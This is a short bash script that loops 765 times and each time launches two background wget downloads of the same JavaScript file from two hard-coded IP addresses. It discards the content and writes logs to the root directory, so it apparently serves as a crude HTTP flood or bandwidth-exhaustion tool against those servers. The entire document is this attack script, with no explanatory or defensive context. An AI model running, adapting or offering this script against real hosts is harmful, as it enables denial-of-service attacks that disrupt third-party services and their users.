for ((i=1; i<=765; i++))  
do  
nohup wget -O sbzp http://111.173.106.99:10000/assets/mount-2ff9e259.js > /${i}-start.log 2>&1 &
nohup wget -O sbzp http://42.202.34.146:10000/assets/mount-2ff9e259.js > /x${i}-start.log 2>&1 &
done
echo ok
